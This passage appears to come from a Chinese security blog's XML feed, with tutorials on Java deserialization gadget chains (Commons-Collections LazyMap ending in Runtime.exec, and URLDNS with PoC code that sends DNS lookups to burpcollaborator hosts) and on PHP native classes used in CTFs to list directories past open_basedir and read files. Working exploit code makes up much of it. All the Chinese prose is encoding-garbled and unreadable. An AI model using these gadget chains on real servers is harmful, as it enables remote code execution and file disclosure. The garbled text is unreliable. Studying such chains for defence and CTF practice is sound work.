class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lazymap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ©ç”¨javaåŠ¨æ€ä»£ç†ï¼Œproxyé‡Œæ”¾LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//memberValuesæ”¾proxy     è¿™é‡Œä¸éœ€è¦è¿›å…¥ifåˆ¤æ–­ï¼Œéšä¾¿å–ä¸€ä¸ªæ³¨è§£å³å¯</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        serilize(o);</span><br><span class="line">        unserlize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppZ1yTS"><img src="https://s1.ax1x.com/2023/03/06/ppZ1yTS.png" alt="ppZ1yTS.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--URLDNSé“¾</title>
      <link href="/2022/10/01/URLDNS%E9%93%BE/"/>
      <url>/2022/10/01/URLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p><code>URLDNS</code>é“¾é€šå¸¸ç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨<code>Java</code>ååºåˆ—åŒ–æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URLDNSé“¾é€šè¿‡å‘èµ·DNSè¯·æ±‚ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</span><br><span class="line">URLDNSé“¾ä¸é™åˆ¶jdkç‰ˆæœ¬ï¼Œé“¾å­ä¸­æ‰€ä½¿ç”¨çš„ç±»å‡ä¸ºJavaå†…ç½®ç±»</span><br></pre></td></tr></table></figure><h1 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h1><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">   HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">         URL.hashCode()</span><br></pre></td></tr></table></figure><p>ä»<code>HashMap.readObject()</code>å…¥æ‰‹</p><p><a href="https://imgse.com/i/ppEPzUU"><img src="https://s1.ax1x.com/2023/03/04/ppEPzUU.png" alt="ppEPzUU.png"></a></p><p>è¿™é‡Œé€šè¿‡<code>for</code>å¾ªç¯å°†<code>HashMap</code>ä¸­å­˜å‚¨çš„<code>key</code>å’Œ<code>value</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åè°ƒç”¨<code>putVal()</code></p><p>è·Ÿè¿›ï¼Œ<code>putVal()</code>ä¸­åˆè°ƒç”¨äº†<code>hash()</code>å‡½æ•°</p><p><a href="https://imgse.com/i/ppEi8qP"><img src="https://s1.ax1x.com/2023/03/04/ppEi8qP.png" alt="ppEi8qP.png"></a></p><p>å¦‚æœkeyå€¼ä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨<code>key.hashCode()</code></p><p>å¦‚æœä»¤keyä¸ºURLç±»ï¼Œå³å¯è°ƒç”¨åˆ°<code>URL.hashCode()</code>ä»¥å‘èµ·DNSè¯·æ±‚</p><p><strong>demo</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://iseq4987tqunxpq388dq2ng8azgr4g.burpcollaborator.net&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç ï¼Œå¯ä»¥å‘ç°åœ¨æ²¡æœ‰è¿›è¡Œååºåˆ—åŒ–æ—¶å°±æ¥æ”¶åˆ°äº†DNSè¯·æ±‚</p><p><a href="https://imgse.com/i/ppEnEqJ"><img src="https://s1.ax1x.com/2023/03/04/ppEnEqJ.png" alt="ppEnEqJ.png"></a></p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><p>é—®é¢˜å‡ºåœ¨putå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åœ¨è¿›è¡Œ<code>hashMap.put</code>çš„æ—¶å€™å°±å·²ç»è°ƒç”¨äº†putVal()å’Œhash()å‡½æ•°ï¼Œæå‰å‘é€äº†DNSè¯·æ±‚</p><p>å¦ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨URL.hashCodeéœ€è¦æ»¡è¶³<code>hashCode != -1</code>ï¼Œå¦åˆ™ä¸ä¼šå¾€ä¸‹æ‰§è¡Œ</p><p><img src="C:\Users\gh0st\AppData\Roaming\Typora\typora-user-images\image-20230304202923817.png" alt="image-20230304202923817"></p><p>è·Ÿè¿›<code>handler.hashCode()</code>ï¼Œæœ€ç»ˆå‘èµ·DNSè¯·æ±‚çš„æ˜¯<code>URLStreamHandler.hashCode()</code>ï¼Œé€šè¿‡getHostAddress()æ¥è¿›è¡ŒDNSè§£æè¿”å›å¯¹åº”çš„IP</p><p><a href="https://imgse.com/i/ppEnjSK"><img src="https://s1.ax1x.com/2023/03/04/ppEnjSK.png" alt="ppEnjSK.png"></a></p><p>æ‰€ä»¥éœ€è¦åœ¨å¼€å§‹æ—¶è®²hashCodeçš„å€¼æ”¹ä¸ºä¸æ˜¯-1ï¼Œé¿å…putæ—¶è¿›è¡ŒDNSè¯·æ±‚ï¼ŒåŒæ—¶åœ¨è¿›è¡Œåºåˆ—åŒ–ä¹‹å‰å°†hashCodeå€¼æ”¹ä¸º-1ï¼Œä¿è¯åœ¨ååºåˆ—åŒ–æ—¶å‘é€DNSè¯·æ±‚</p><p>é€šè¿‡åå°„ï¼Œå¯ä»¥è½»æ¾è§£å†³é—®é¢˜</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://1hj9tsxqi9j6m8fmxr29r65rzi5ct1.burpcollaborator.net&quot;</span>);</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; c = url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">222</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppEugne"><img src="https://s1.ax1x.com/2023/03/04/ppEugne.png" alt="ppEugne.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpåŸç”Ÿç±»çš„åˆ©ç”¨</title>
      <link href="/2022/05/29/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2022/05/29/php%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="phpåŸç”Ÿç±»"><a href="#phpåŸç”Ÿç±»" class="headerlink" title="phpåŸç”Ÿç±»"></a><strong>phpåŸç”Ÿç±»</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpçš„å†…ç½®ç±»ï¼Œå³ä¸éœ€è¦åœ¨å½“å‰è„šæœ¬å†™å‡ºï¼Œä½†ä¹Ÿå¯ä»¥å®ä¾‹åŒ–çš„ç±»</span><br></pre></td></tr></table></figure><p>å¯é€šè¿‡ä¸€ä¸ªè„šæœ¬å¯»æ‰¾phpä¸­çš„åŸç”Ÿç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/002845eb7a1649d1905f6ac91932c21e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¯”èµ›ä¸­å¸¸ç”¨çš„æœ‰ä»¥ä¸‹å‡ ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">Exception</span><br><span class="line">SoapClient</span><br><span class="line">DirectoryIterator</span><br><span class="line">Filesystemlterator</span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ç”¨é€”å¯åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ª</p><h2 id="éå†ç›®å½•"><a href="#éå†ç›®å½•" class="headerlink" title="éå†ç›®å½•"></a>éå†ç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator ç±»</span><br><span class="line">FilesystemIterator ç±»</span><br><span class="line">GlobIterator ç±»</span><br></pre></td></tr></table></figure><p>æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œå¯ä»¥å‘ç°</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041004050.png" alt="image-20221004100450009"></p><p><strong>FilesystemIterator</strong>æ˜¯<strong>DirectoryIterator</strong>çš„å­ç±»</p><p>åœ¨DirectoryIteratorä¸‹æœ‰__toString()æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041051216.png" alt="image-20221004105120134"></p><p><strong>demo</strong></p><p>è¿™æ ·ä¼šè§¦å‘__toString() æ–¹æ³•ï¼Œè¾“å‡ºæ ¹ç›®å½•ä¸‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dirname</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dirname</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$RECYCLE.BIN</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡foreachè¿›è¡Œå¾ªç¯éå†å¯è¾“å‡ºæŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dirname</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dirname</span> <span class="keyword">as</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041053346.png" alt="image-20221004105355269"></p><p>å¯ä»¥åœ¨æœ¬åœ°å†å°å°æµ‹è¯•ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); <span class="comment">//ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041055870.png" alt="image-20221004105540790"></p><p>å¯ä»¥åŠ ä¸Šå’Œglobåè®®çš„ä½¿ç”¨ï¼Œå¯ä»¥æ›´å¿«é€Ÿç²¾å‡†çš„æŸ¥æ‰¾</p><p>æŸ¥æ‰¾æ‰€æœ‰txtæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041058300.png" alt="image-20221004105822213"></p><p><strong>FilesystemIterator</strong>ç”¨æ³•å’ŒDirectoryIteratorä¸€æ ·</p><p><strong>GlobIterator</strong>ç±»ä¸å‰ä¸¤ä¸ªç±»çš„ç”¨æ³•ä¹Ÿç›¸ä¼¼ï¼Œåªæ˜¯GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œç›¸å½“äºè‡ªèº«å¸¦æœ‰globåè®®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;/*txt*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.txt</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ç§éå†ç›®å½•çš„æ–¹æ³•å¯ä»¥æ— è§†<strong>open_basedir</strong>å¯¹ç›®å½•çš„é™åˆ¶</p><h2 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplFileObject ç±»</span><br></pre></td></tr></table></figure><p>è¯¥ç±»çš„æ„é€ æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¯¹è±¡ç”¨äºåç»­çš„è¯»å–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span 